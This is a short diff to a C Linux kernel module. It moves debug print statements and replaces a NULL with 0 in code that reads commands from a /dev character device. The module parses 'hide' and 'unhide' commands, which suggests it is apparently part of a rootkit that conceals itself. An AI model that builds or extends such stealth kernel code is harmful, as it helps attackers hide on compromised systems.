@@ -72,10 +72,10 @@ static const struct file_operations file_ops = { // operations on our /dev/$file
 };
 
 static void parse_command(char * cmd) {
-	pr_info("In parse_command.\n");
-	pr_info("Our command: '%s'", cmd);
 	int hide;
 	int unhide;
+	pr_info("In parse_command.\n");
+	pr_info("Our command: '%s'", cmd);
 	hide = strncmp(cmd, "hide\n", BUFF_LEN);
 	pr_info("Hide? %d\n", hide);
 	if (hide == 0) {
@@ -99,7 +99,7 @@ static ssize_t device_write(struct file *flip, const char *buffer, size_t len, l
 	for (i = 0; i < len && i < BUFF_LEN; i++)
 		get_user(msg[i], buffer + i);
 
-	msg[i] = NULL; // null terminating byte; very important!
+	msg[i] = 0; // null terminating byte; very important!
 	msg_ptr = msg;
 
 	/* 
